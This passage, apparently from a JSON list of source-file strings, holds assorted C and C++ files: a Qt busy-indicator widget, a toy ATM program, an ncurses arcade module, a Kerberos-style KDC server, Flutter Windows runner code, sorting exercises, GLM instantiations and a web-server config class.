);\n\t\td->size = QSize( d->outerRadius * 2, d->outerRadius * 2 );\n\n\t\tupdateGeometry();\n\t}\n}\n\nint\nBusyIndicator::percent() const\n{\n\treturn d->percent;\n}\n\nvoid\nBusyIndicator::setPercent( int p )\n{\n\tif( d->percent != p )\n\t{\n\t\td->percent = p;\n\t\t\n\t\tif( d->showPercent )\n\t\t\tupdate();\n\t}\n}\n\nbool\nBusyIndicator::showPercent() const\n{\n\treturn d->showPercent;\n}\n\nvoid\nBusyIndicator::setShowPercent( bool on )\n{\n\tif( d->showPercent != on )\n\t{\n\t\td->showPercent = on;\n\t\t\n\t\tupdate();\n\t}\n}\n\nQSize\nBusyIndicator::minimumSizeHint() const\n{\n\treturn d->size;\n}\n\nQSize\nBusyIndicator::sizeHint() const\n{\n\treturn d->size;\n}\n\nvoid\nBusyIndicator::paintEvent( QPaintEvent * )\n{\n\tQPainter p( this );\n\tp.setRenderHint( QPainter::Antialiasing );\n\tp.translate( width() / 2, height() / 2 );\n\n\tQPainterPath path;\n\tpath.setFillRule( Qt::OddEvenFill );\n\tpath.addEllipse( - d->outerRadius, - d->outerRadius,\n\t\td->outerRadius * 2, d->outerRadius * 2 );\n\tpath.addEllipse( - d->innerRadius, - d->innerRadius,\n\t\td->innerRadius * 2, d->innerRadius * 2 );\n\n\tp.setPen( Qt::NoPen );\n\n\tQConicalGradient gradient( 0, 0, - d->animation->currentValue().toReal() );\n\tgradient.setColorAt( 0.0, Qt::transparent );\n\tgradient.setColorAt( 0.05, d->color );\n\tgradient.setColorAt( 1.0, Qt::transparent );\n\n\tp.setBrush( gradient );\n\n\tp.drawPath( path );\n\t\n\tif( d->showPercent )\n\t{\n\t\tp.setBrush( d->color );\n\t\tp.setPen( d->color );\n\t\tauto f = p.font();\n\t\tf.setPixelSize( qRound( (double) d->innerRadius * 0.8 ) );\n\t\tp.setFont( f );\n\t\tp.drawText( QRect( -d->innerRadius, -d->innerRadius,\n\t\t\t\td->innerRadius * 2, d->innerRadius * 2 ),\n\t\t\tQt::AlignHCenter | Qt::AlignVCenter,\n\t\t\tQString( \"%1%2\" ).arg( QString::number( d->percent ),\n\t\t\t\tQStringLiteral( \"%\" ) ) );\n\t}\n}\n\nvoid\nBusyIndicator::_q_update( const QVariant & )\n{\n\tupdate();\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\ndouble balance = 1000;\r\nint deposit, withDraw = 0;\r\nint passWord;\r\nint choice;\r\n\r\nvoid display()\r\n{\r\n  cout << \"***************\\n\";\r\n  cout << \"***** ATM *****\\n\";\r\n  cout << \"***************\\n\";\r\n  cout << \"***** Menu ****\\n\";\r\n  cout << \"1: Balance\\n\";\r\n  cout << \"2: WithDraw\\n\";\r\n  cout << \"3: Deposit\\n\";\r\n  cout << \"4: Exit\\n\";\r\n  cout << \"****************\\n\";\r\n}\r\n\r\nvoid process()\r\n{\r\n  cout << \"Enter Your Password\\n\";\r\n  cin >> passWord;\r\n\r\n  do{\r\n    if (passWord == 1234)\r\n    {\r\n      cout << \"Enter Your Choice\\n\";\r\n      cin >> choice;\r\n\r\n      switch (choice)\r\n      {\r\n      case 1:\r\n        cout << \"Your Balance is \" << balance << \"\\n\";\r\n        break;\r\n      case 2:\r\n        cout << \"Note: Your Balance is \" << balance << \"\\n\";\r\n        cout << \"Enter Your Amount: \";\r\n        cin >> withDraw;\r\n        if (withDraw > balance)\r\n        {\r\n          cout << \"Sorry You Can't Withdraw This Amount\\n\";\r\n        }\r\n        else\r\n        {\r\n          balance -= withDraw;\r\n          cout << \"Now Your Balance is \" << balance << \"\\n\";\r\n        }\r\n        break;\r\n      case 3:\r\n        cout << \"Your Balance is \" << balance << \"\\n\";\r\n        cout << \"Enter Your Deposit Money: \\n\";\r\n        cin >> deposit;\r\n        balance += deposit;\r\n        cout << \"Now Your Balance is \" << balance << \"\\n\";\r\n        break;\r\n      case 4:\r\n        cout << \"Thank You\\n\";\r\n        break;\r\n      }\r\n    } \r\n    else \r\n    {\r\n      char option = 'o';\r\n      cout << \"Password Is Incorrect, If You Want To Try Again ? Enter [Y] For Yes Or [N] For No\\n\";\r\n      cin >> option;\r\n\r\n      if (option == 'Y' || option == 'y') \r\n      {\r\n        cout << \"Enter Your Password\\n\";\r\n        cin >> passWord;\r\n      }\r\n      else choice = 4;\r\n    }\r\n  } while (choice < 4); \r\n}\r\n\r\nint main()\r\n{\r\n  display();\r\n  process();\r\n\r\n  return 0;\r\n}",
    "/*\n** EPITECH PROJECT, 2023\n** B-OOP-400-BAR-4-1-arcade-thomas.fiancette\n** File description:\n** Ncurses\n*/\n\n#include \"Ncurses.hpp\"\n\nNCurses::NCurses(std::string name)\n{\n    this->havebeeno = 1;\n    initscr();\n    noecho();\n    cbreak();\n    start_color();\n    curs_set(FALSE);\n    keypad(stdscr, TRUE);\n    nodelay(stdscr, true);\n    mousemask(ALL_MOUSE_EVENTS, NULL);\n    this->title = 1;\n    this->title_height_btn = 1;\n    this->title_width_btn = 1;\n    this->libname = \"NCURSES\";\n    this->prev_x = 0;\n    this->prev_y = 0;\n    init_pair(1, COLOR_RED, COLOR_BLACK);\n    init_pair(2, COLOR_GREEN, COLOR_BLACK);\n    init_pair(3, COLOR_BLUE, COLOR_BLACK);\n    init_pair(4, COLOR_CYAN, COLOR_BLACK);\n    init_pair(5, COLOR_BLACK, COLOR_BLACK);\n    init_pair(6, COLOR_YELLOW, COLOR_BLACK);\n    init_pair(7, COLOR_WHITE, COLOR_BLACK);\n    return;\n}\n\nNCurses::NCurses()\n{\n    this->havebeeno = 0;\n}\n\nNCurses::~NCurses()\n{\n    if (this->havebeeno == 0)\n        return;\n    endwin();\n}\n\nvoid NCurses::clear()\n{\n    erase();\n}\n\nvoid NCurses::display()\n{\n    refresh();\n}\n\nvoid NCurses::drawMap(const std::vector<std::vector<int>> &map)\n{\n    std::vector<float> pos = {1.f, 1.f, 1.f, 1.f};\n    for (std::size_t c = 0; c < map.size(); c++) {\n        pos[1] = c * this->getTileSize();\n        pos[2] = map.size();\n        for (std::size_t i = 0; i < map[c].size(); i++) {\n            pos[0] = i * this->getTileSize();\n            pos[3] = map[c].size();\n            if (this->chartocolor.count(map[c][i]) > 0) {\n                this->drawSprite(map[c][i], pos, this->chartocolor[map[c][i]]);\n            } else\n                this->drawSprite(map[c][i], pos, colors::WHITE);\n        }\n    }\n}\n\nvoid NCurses::drawSprite(int type, const std::vector<float> &pos, colors::Color color)\n{\n    std::vector<int> all = this->mapToWindow({static_cast<int>(pos[0]), static_cast<int>(pos[1]), 0, 0});\n    double y = getmaxy(stdscr);\n    int col = 7;\n    if (this->getcolor.count(color) > 0)\n        col = this->getcolor.at(color);\n    attron(COLOR_PAIR(col));\n    mvprintw(pos[1], pos[0], this->maps[type].c_str());\n    attroff(COLOR_PAIR(col));\n}\n\nvoid NCurses::drawText(const std::string &text, const std::vector<int> &pos, colors::Color color)\n{\n    int col = 7;\n    if (this->getcolor.count(color) > 0)\n        col = this->getcolor.at(color);\n    attron(COLOR_PAIR(col));\n    mvprintw(pos[1], pos[0], text.c_str());\n    attroff(COLOR_PAIR(col));\n}\n\nvoid NCurses::drawButton(const std::string &text, const std::vector<int> &poss, const std::vector<int> &sizes, colors::Color color)\n{\n    std::vector<int> all = this->mapToWindow({poss[0], poss[1], sizes[0], sizes[1]});\n    int height = all[2];\n    int word = text.size();\n    int width = all[3];\n    if (width % 2 == 0)\n        width--;\n    if (height % 2 == 0)\n        height--;\n    attron(COLOR_PAIR(this->getcolor.at(color)));\n    for (int i = 0; i < height; i++) {\n        for (int j = 0; j < width; j++) {\n            if ((j == 0 || j == width - 1) && (i == 0 || i == height - 1)) {\n                mvprintw(all[1] + i, all[0] + j, \"+\");\n            } else if ((i == 0 || i == height - 1) && (j != 0 && j != width - 1)) {\n                mvprintw(all[1] + i, all[0] + j, \"-\");\n            } else if (j == 0 || j == width - 1) {\n                mvprintw(all[1] + i, all[0] + j, \"|\");\n            } else {\n                mvprintw(all[1] + i, all[0] + j, \" \");\n            }\n        }\n    }\n    attroff(COLOR_PAIR(this->getcolor.at(color)));\n    if (word > 0 && text[0] != '/') {\n        drawText(text, {all[0] + (width / 2) - word / 2, all[1] + (height / 2)}, color);\n    }\n}\n\nvoid NCurses::handleMusic(const std::string &path, bool loop, bool play)\n{\n    (void)(path);\n    (void)(loop);\n    (void)(play);\n}\n\nconst std::string &NCurses::getSpritePath(int type) const\n{\n    return this->maps.at(type);\n}\n\nbool NCurses::isMousePressed()\n{\n    if (ch == KEY_MOUSE) {\n        if (getmouse(&this->event) == OK) {\n            return true;\n        }\n    }\n    return false;\n}\n\nvoid NCurses::fetchEvents()\n{\n    getmaxyx(stdscr, this->wind_y, this->wind_x);\n    this->ch = getch();\n    if (ch == KEY_MOUSE) {\n        if (getmouse(&this->event) == OK) {\n            this->aenv = this->eventtype[this->event.bstate];\n            this->prev_x = this->event.x;\n            this->prev_y = this->event.y;\n            return;\n        }\n    }\n    if (eventtype.count(ch) > 0) {\n        this->aenv = this->eventtype[ch];\n    } else\n        this->aenv = events::Events::NONE;\n}\n\nstd::vector<int> NCurses::getMousePos()\n{\n    return {this->prev_x, this->prev_y};\n}\n\nvoid NCurses::setWindowSize(int width, int height)\n{\n    (void)(width);\n    (void)(height);\n}\n\nevents::Event NCurses::getEvents()\n{\n    return this->aenv;\n}\n\nextern \"C\"\n{\n    NCurses* createDisplayModule(char *name)\n    {\n        if (name != NULL)\n            return new NCurses(\"NCurses\");\n        else\n            return new NCurses();\n    }\n}\n\nextern \"C\"\n{\n    void destroyDisplayModule(NCurses* module1)\n    {\n",
    "\ufeff#include <iostream>\n#include <boost/asio/io_context.hpp>\n#include <boost/asio.hpp>\n#include \"json.hpp\"\n#include <bitset>\n#include \"kdc.h\"\n#include <future>\n#include \"SS.h\"\n\nclass session : public std::enable_shared_from_this<session>\n{\npublic:\n    session(boost::asio::ip::tcp::socket socket)\n        : m_socket(std::move(socket)) { }\n    void run() {\n        m_buffer.prepare(1024);\n        wait_for_request();\n    }\nprivate:\n    void wait_for_request() {\n        auto self(shared_from_this());\n        boost::asio::async_read_until(m_socket, m_buffer, \"\\0\", [this, self](boost::system::error_code ec, std::size_t length)\n            {\n                if (!ec)  {\n                nlohmann::json jd_out;\n\n\n                    std::string data{ std::istreambuf_iterator<char>(&m_buffer),\n                                                                std::istreambuf_iterator<char>()\n                                                               };\n\n                std::cout << \"size: \" <<  m_buffer.size() << '\\n';\n                    std::cout << \"recvd data: \" << data << '\\n';\n                    nlohmann::json jd = nlohmann::json::parse(data);\n                    std::cout << \"recvd data: \" << data << '\\n';\n\n\n                    if (jd[\"type\"] == wstring_to_bitset(L\"as\").to_string()) {\n                        std::bitset<64> log = std::bitset<64>((std::string)jd.at(\"c\"));\n\n                        std::wcout << \"\\n\\nrecvd login: \" << bitset_to_wstring(log) << '\\n';\n\n                        if (KDC::send_login(bitset_to_wstring(log))) {\n                            std::wcout << \"login was found!\\n\";\n\n                            auto ret = KDC::recv_first();\n                            jd_out[\"status\"] = \"ok\";\n\n                            for (auto x:ret) {\n                                jd_out[x.first] = x.second.to_string();\n                            }\n\n                        } else {\n                            std::wcout << \"login was not found!\\n\";\n\n                            jd_out[\"status\"] = \"err\";\n                            jd_out[\"msg\"] = \"No suh login\";\n                        }\n\n                    } else if (jd[\"type\"] == \"tgs\") {\n                        std::cout << \"\\n\\ntgs recv: \\n\";\n\n                        for (auto x:jd.items()) {\n                            std::cout << x.key() << ' ' << x.value() << '\\n';\n                        }\n\n                        std::map<std::string, std::bitset<64>> mp;\n\n                        for (auto x: jd.items()) {\n                            if (x.key() != \"type\") [[likely]] {\n                                mp[x.key()] = std::bitset<64>((std::string)x.value());\n                            }\n                        }\n\n                        int tgs_res = KDC::send_to_tgs(mp);\n\n                        if (tgs_res == 0) [[likely]] {\n                            std::cout << \"Cool!!\\n\";\n\n                            jd_out[\"status\"] = \"ok\";\n\n                            auto tgs_resp = KDC::recv_tgs();\n\n                            for (auto x:tgs_resp) {\n                                //\n                                jd_out[x.first] = x.second.to_string();\n                            }\n                        } else if (tgs_res == 1) {\n                            std::cout << \"smth went wrong!\\n\";\n\n                            jd_out[\"status\"] = \"err\";\n                            jd_out[\"msg\"] = \"different login in aut and tgt\";\n                        } else if (tgs_res == 2) {\n                            std::cout << \"smth went wrong!\\n\";\n\n                            jd_out[\"status\"] = \"err\";\n                            jd_out[\"msg\"] = \"different tgs in req and server\";\n                        } else if (tgs_res == 3) {\n                            std::cout << \"smth went wrong!\\n\";\n\n                            jd_out[\"status\"] = \"err\";\n                            jd_out[\"msg\"] = \"req is outdated\";\n                        } else if (tgs_res == 4) {\n                            std::cout << \"smth went wrong!\\n\";\n\n                            jd_out[\"status\"] = \"err\";\n                            jd_out[\"msg\"] = \"different Kc_tgs in tgt and req\";\n                        }\n                    } else {\n                        std::cout << \"Oh no, wrong req type:(\\n\";\n\n                        jd_out[\"status\"] = \"err\";\n                        jd_out[\"msg\"] = \"Wrong req type\";\n                    }\n\n                    send_buf = jd_out.dump() + '\\0';\n\n                    send_response();\n\n                    /*boost::asio::async_write(m_socket, boost::asio::buffer(send_buf),\n                                             [this, self](boost::system::error_code ec, std::size_t /*length)\n                                             {\n\n\n                                                 std::cout << send_buf << '\\n';\n                                                 if (!ec) {\n\n                                                 } else {\n                                           ",
    "#include <stdio.h>\n\nint cuadrado(int numero){\n    return (numero*numero);\n}\n\nvoid cuadrado_void(int numero, int *resultado){\n    *resultado = numero * numero;\n}\n\nvoid mostrar_direccion_contenido(int &valor){\n    printf(\"\\nEl valor es %d\", valor);\n    printf(\"\\nEL valor esta almacenado en la direccion de memoria %p\", &valor);\n}\n\nvoid invertir(int *valor1, int *valor2){ //Estos punt. apuntan a las dir de mem. de las var.\n    int aux;\n    aux = *valor1;//Asigno a aux el valor que se encuentra en la direcci\u00f3n de memoria apuntada por valor1\n    *valor1=*valor2;\n    *valor2=aux;\n}\n\nvoid ordenar(int *valor1, int *valor2){\n    if(*valor1>*valor2){ //Comparo los valores a los que apuntan \n                        //Si estarian sin los * estaria comparando las direcciones de memoria\n        printf(\"\\n\\nDireccion de memoria de v1:%p y de v2:%p\", valor1, valor2);\n        invertir(valor1, valor2);\n    /*Cuando llamamos a invertir desde ordenar, no necesitamos usar el operador & porque \n    valor1 y valor2 ya son punteros que contienen las direcciones de memoria de las variables */\n    }\n}\n\nint main(){\n    int numero = 4;\n    int resultado;\n    int valor1, valor2;\n    \n    //a) Haga una funci\u00f3n que devuelva el cuadrado de un n\u00famero\n    printf(\"\\nEl cuadrado de %d es %d\", numero, cuadrado(numero));\n    \n    //b) Haga una funci\u00f3n que devuelva el cuadrado de un n\u00famero con void\n    cuadrado_void(numero, &resultado);\n    printf(\"\\nEl cuadrado de %d con void es %d\", numero, resultado);\n    printf(\"\\n\\n\");\n    \n    /* c) Al recibir una variable muestre por pantalla la direcci\u00f3n y el contenido de\n    la variable*/\n    printf(\"\\nEL valor %d esta almacenado en la direccion de memoria %p\",numero, &numero);\n    mostrar_direccion_contenido(numero);\n    printf(\"\\n\\n\");\n\n    //f) Cargar valores y probar las funciones\n    printf(\"\\nIngresar valor 1: \");\n    scanf(\"%d\",&valor1);\n    getchar();\n    printf(\"\\nIngresar valor 2: \");\n    scanf(\"%d\",&valor2);\n    getchar();\n\n    /* d) Dado dos par\u00e1metros de entrada, deber\u00e1 invertir los valores entre     \n    ambos. */   \n    printf(\"\\nvalor1=%d, valor2=%d\",valor1,valor2);\n    printf(\"\\nInvierto valores\");\n    invertir(&valor1, &valor2); //Notar que aqui x e y no fueron declarados como punteros por eso usamos &\n    printf(\"\\nvalor1=%d, valor2=%d\",valor1,valor2);\n    printf(\"\\n\");\n    /*  Para pasar las direcciones de memoria de num1 y num2 a la funci\u00f3n invertir, \n    se utilizan los operadores & (que obtiene la direcci\u00f3n de memoria de una variable) \n    en la llamada invertir(&num1, &num2). Esto permite a la funci\u00f3n invertir acceder \n    y modificar directamente los valores de num1 y num2 */\n\n    /* e) Dado dos par\u00e1metros de entrada, deber\u00e1 devolverlos de forma\n    ordenada, en el primer par\u00e1metro el menor y en el segundo el mayor. */\n    printf(\"\\nvalor1=%d, valor2=%d\",valor1,valor2);\n    printf(\"\\nOrdeno valores\");\n    ordenar(&valor1,&valor2);\n    printf(\"\\nvalor1=%d, valor2=%d\",valor1,valor2);\n    \n    return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"new_instagram_ui\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <algorithm>\n#include <format>\n#include \"ListOperationsKit.h\"\n\nvoid quick_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if(begin < end) {\n        int i = begin, j = end, pivot = list.get(begin);\n        do {\n            while (list[i] < pivot) ++i;\n            while (list[j] > pivot) --j;\n            if (i <= j) {\n                list.swap(i, j);\n                ++i;\n                --j;\n            }\n        } while(i <= j);\n        quick_sort(begin, j, list);\n        quick_sort(i, end, list);\n    }\n}\n\nvoid merge(int begin, int mid, int end, ListOperationsKit<int>& list) {\n    int i = begin, j = mid + 1, k = 0;\n    ListOperationsKit<int> temp;\n    while (i <= mid && j <= end) {\n        if (list.get(i) < list[j]) {\n            temp.append(list[i]);\n            ++i;\n        } else {\n            temp.append(list[j]);\n            ++j;\n        }\n    }\n    while (i <= mid) {\n        temp.append(list[i]);\n        ++i;\n    }\n    while (j <= end) {\n        temp.append(list[j]);\n        ++j;\n    }\n    for (int n = begin; n <= end; ++n) {\n        list[n] = temp[k];\n        ++k;\n    }\n}\n\nvoid merge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (begin < end) {\n        int mid = (begin + end) / 2;\n        merge_sort(begin, mid, list);\n        merge_sort(mid + 1, end, list);\n        merge(begin, mid, end, list);\n    }\n}\n\nvoid stooge_sort(int begin, int end, ListOperationsKit<int>& list) {\n    if (list.get(begin) > list(end)) {\n        list.swap(begin, end);\n    }\n    if (end - begin + 1 > 2) {\n        int t = (end - begin + 1) / 3;\n        stooge_sort(begin, end - t, list);\n        stooge_sort(begin + t, end, list);\n        stooge_sort(begin, end - t, list);\n    }\n}\n\nint main() {\n    ListOperationsKit<int> list_1, list_2, list_3;\n\n    list_1.random_append(10);\n    list_2.random_append(10, 2, 50);\n    list_3.append(99, 53, 21, 8, 9, 10, 11, 12, 65, 94);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    std::cout << std::endl;\n\n    quick_sort(0, list_1.length(), list_1);\n    merge_sort(0, list_2.length(), list_2);\n    stooge_sort(0, list_3.length(), list_3);\n\n    std::cout << list_1 << std::endl;\n    std::cout << list_2 << std::endl;\n    std::cout << list_3 << std::endl;\n\n    return 0;\n}",
    "/// @ref core\n/// @file glm/glm.cpp\n\n#ifndef GLM_ENABLE_EXPERIMENTAL\n#define GLM_ENABLE_EXPERIMENTAL\n#endif\n#include <glm/gtx/dual_quaternion.hpp>\n#include <glm/gtc/vec1.hpp>\n#include <glm/gtc/quaternion.hpp>\n#include <glm/ext/scalar_int_sized.hpp>\n#include <glm/ext/scalar_uint_sized.hpp>\n#include <glm/glm.hpp>\n\nnamespace glm\n{\n// tvec1 type explicit instantiation\ntemplate struct vec<1, uint8, lowp>;\ntemplate struct vec<1, uint16, lowp>;\ntemplate struct vec<1, uint32, lowp>;\ntemplate struct vec<1, uint64, lowp>;\ntemplate struct vec<1, int8, lowp>;\ntemplate struct vec<1, int16, lowp>;\ntemplate struct vec<1, int32, lowp>;\ntemplate struct vec<1, int64, lowp>;\ntemplate struct vec<1, float32, lowp>;\ntemplate struct vec<1, float64, lowp>;\n\ntemplate struct vec<1, uint8, mediump>;\ntemplate struct vec<1, uint16, mediump>;\ntemplate struct vec<1, uint32, mediump>;\ntemplate struct vec<1, uint64, mediump>;\ntemplate struct vec<1, int8, mediump>;\ntemplate struct vec<1, int16, mediump>;\ntemplate struct vec<1, int32, mediump>;\ntemplate struct vec<1, int64, mediump>;\ntemplate struct vec<1, float32, mediump>;\ntemplate struct vec<1, float64, mediump>;\n\ntemplate struct vec<1, uint8, highp>;\ntemplate struct vec<1, uint16, highp>;\ntemplate struct vec<1, uint32, highp>;\ntemplate struct vec<1, uint64, highp>;\ntemplate struct vec<1, int8, highp>;\ntemplate struct vec<1, int16, highp>;\ntemplate struct vec<1, int32, highp>;\ntemplate struct vec<1, int64, highp>;\ntemplate struct vec<1, float32, highp>;\ntemplate struct vec<1, float64, highp>;\n\n// tvec2 type explicit instantiation\ntemplate struct vec<2, uint8, lowp>;\ntemplate struct vec<2, uint16, lowp>;\ntemplate struct vec<2, uint32, lowp>;\ntemplate struct vec<2, uint64, lowp>;\ntemplate struct vec<2, int8, lowp>;\ntemplate struct vec<2, int16, lowp>;\ntemplate struct vec<2, int32, lowp>;\ntemplate struct vec<2, int64, lowp>;\ntemplate struct vec<2, float32, lowp>;\ntemplate struct vec<2, float64, lowp>;\n\ntemplate struct vec<2, uint8, mediump>;\ntemplate struct vec<2, uint16, mediump>;\ntemplate struct vec<2, uint32, mediump>;\ntemplate struct vec<2, uint64, mediump>;\ntemplate struct vec<2, int8, mediump>;\ntemplate struct vec<2, int16, mediump>;\ntemplate struct vec<2, int32, mediump>;\ntemplate struct vec<2, int64, mediump>;\ntemplate struct vec<2, float32, mediump>;\ntemplate struct vec<2, float64, mediump>;\n\ntemplate struct vec<2, uint8, highp>;\ntemplate struct vec<2, uint16, highp>;\ntemplate struct vec<2, uint32, highp>;\ntemplate struct vec<2, uint64, highp>;\ntemplate struct vec<2, int8, highp>;\ntemplate struct vec<2, int16, highp>;\ntemplate struct vec<2, int32, highp>;\ntemplate struct vec<2, int64, highp>;\ntemplate struct vec<2, float32, highp>;\ntemplate struct vec<2, float64, highp>;\n\n// tvec3 type explicit instantiation\ntemplate struct vec<3, uint8, lowp>;\ntemplate struct vec<3, uint16, lowp>;\ntemplate struct vec<3, uint32, lowp>;\ntemplate struct vec<3, uint64, lowp>;\ntemplate struct vec<3, int8, lowp>;\ntemplate struct vec<3, int16, lowp>;\ntemplate struct vec<3, int32, lowp>;\ntemplate struct vec<3, int64, lowp>;\ntemplate struct vec<3, float32, lowp>;\ntemplate struct vec<3, float64, lowp>;\n\ntemplate struct vec<3, uint8, mediump>;\ntemplate struct vec<3, uint16, mediump>;\ntemplate struct vec<3, uint32, mediump>;\ntemplate struct vec<3, uint64, mediump>;\ntemplate struct vec<3, int8, mediump>;\ntemplate struct vec<3, int16, mediump>;\ntemplate struct vec<3, int32, mediump>;\ntemplate struct vec<3, int64, mediump>;\ntemplate struct vec<3, float32, mediump>;\ntemplate struct vec<3, float64, mediump>;\n\ntemplate struct vec<3, uint8, highp>;\ntemplate struct vec<3, uint16, highp>;\ntemplate struct vec<3, uint32, highp>;\ntemplate struct vec<3, uint64, highp>;\ntemplate struct vec<3, int8, highp>;\ntemplate struct vec<3, int16, highp>;\ntemplate struct vec<3, int32, highp>;\ntemplate struct vec<3, int64, highp>;\ntemplate struct vec<3, float32, highp>;\ntemplate struct vec<3, float64, highp>;\n\n// tvec4 type explicit instantiation\ntemplate struct vec<4, uint8, lowp>;\ntemplate struct vec<4, uint16, lowp>;\ntemplate struct vec<4, uint32, lowp>;\ntemplate struct vec<4, uint64, lowp>;\ntemplate struct vec<4, int8, lowp>;\ntemplate struct vec<4, int16, lowp>;\ntemplate struct vec<4, int32, lowp>;\ntemplate struct vec<4, int64, lowp>;\ntemplate struct vec<4, float32, lowp>;\ntemplate struct vec<4, float64, lowp>;\n\ntemplate struct vec<4, uint8, mediump>;\ntemplate struct vec<4, uint16, mediump>;\ntemplate struct vec<4, uint32, mediump>;\ntemplate struct vec<4, uint64, mediump>;\ntemplate struct vec<4, int8, mediump>;\ntemplate struct vec<4, int16, mediump>;\ntemplate struct vec<4, int32, mediump>;\ntemplate struct vec<4, int64, mediump>;\ntemplate struct vec<4, float32, mediump>;\ntemplate struct vec<4, float64, mediump>;\n\ntemplate struct vec<4, uint8, highp>;\ntemplate struct vec<4, uint16, highp>;\ntemplate struct vec<4, uint32, highp>;\ntemplate struct vec<4, uint64, highp>;\ntemplate struct vec<4, int8, highp>;\ntemplate struct vec<4, int16, hig",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   LocationConfig.cpp                                 :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: migarci2 <migarci2@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/04/05 17:32:54 by migarci2          #+#    #+#             */\n/*   Updated: 2024/04/05 22:49:20 by migarci2         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"LocationConfig.hpp\"\n\nLocationConfig::LocationConfig()\n{\n    autoindex = true;\n\tallowMethods.push_back(\"GET\");\n\tindex = \"index.html\";\n\troot = \"\";\n}\n\nLocationConfig::LocationConfig(std::string serverRoot)\n{\n\tautoindex = true;\n\tallowMethods.push_back(\"GET\");\n\tindex = \"index.html\";\n\troot = serverRoot;\n}\n\nLocationConfig::LocationConfig(const LocationConfig &other)\n{\n    *this = other;\n}\n\nLocationConfig::~LocationConfig() {}\n\nLocationConfig &LocationConfig::operator=(const LocationConfig &other)\n{\n    if (this != &other)\n    {\n        root = other.root;\n        allowMethods = other.allowMethods;\n        index = other.index;\n        autoindex = other.autoindex;\n        returnPath = other.returnPath;\n        alias = other.alias;\n    }\n    return *this;\n}\n\nstd::string LocationConfig::getRoot() const\n{\n    return root;\n}\n\nstd::vector<std::string> LocationConfig::getAllowMethods() const\n{\n    return allowMethods;\n}\n\nstd::string LocationConfig::getIndex() const\n{\n    return index;\n}\n\nbool LocationConfig::getAutoindex() const\n{\n    return autoindex;\n}\n\nstd::string LocationConfig::getReturnPath() const\n{\n    return returnPath;\n}\n\nstd::string LocationConfig::getAlias() const\n{\n    return alias;\n}\n\nstd::vector<std::string> LocationConfig::getCgiPaths() const\n{\n    return cgiPaths;\n}\n\nstd::vector<std::string> LocationConfig::getCgiExtensions() const\n{\n    return cgiExtensions;\n}\n\nvoid LocationConfig::setRoot(const std::string &r)\n{\n    root = r;\n}\n\nvoid LocationConfig::setAllowMethods(const std::vector<std::string> &methods)\n{\n    allowMethods = methods;\n}\n\nvoid LocationConfig::addAllowMethod(const std::string &method)\n{\n    allowMethods.push_back(method);\n}\n\nvoid LocationConfig::setIndex(const std::string &i)\n{\n    index = i;\n}\n\nvoid LocationConfig::setAutoindex(bool ai)\n{\n    autoindex = ai;\n}\n\nvoid LocationConfig::setReturnPath(const std::string &rp)\n{\n    returnPath = 